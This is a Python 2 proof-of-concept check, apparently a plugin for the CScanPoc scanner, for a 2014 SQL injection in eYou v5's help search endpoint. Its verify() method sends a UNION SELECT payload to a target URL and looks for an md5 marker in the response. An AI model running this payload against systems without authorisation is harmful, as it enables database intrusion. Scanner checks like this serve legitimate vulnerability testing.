# coding: utf-8

import urllib2
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = '' # 平台漏洞编号，留空
    name = 'eYou v5 /em/controller/action/help.class.php SQL Injection' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-09-23'  # 漏洞公布时间
    desc = '''
    eYou v5 has sql injection in /.
    ''' # 漏洞描述
    ref = 'http://wooyun.org/bugs/wooyun-2014-058014"' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    product = 'eYou'  # 漏洞应用名称
    product_version = 'v5'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '6f4b2df6-731a-4a9c-b210-dbed683ac312'
    author = 'cscan'  # POC编写者
    create_date = '2018-3-24' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        payload = '") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,md5(360213360213),NULL#'
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            path = "{target}/user/?q=help&type=search&page=1&kw=".format(target=self.target)+payload
            request = urllib2.Request(path)
            response = urllib2.urlopen(request)
            content = response.read()
            res= '5d975967029ada386ba2980a04b7720e'
            if res in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            pass

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
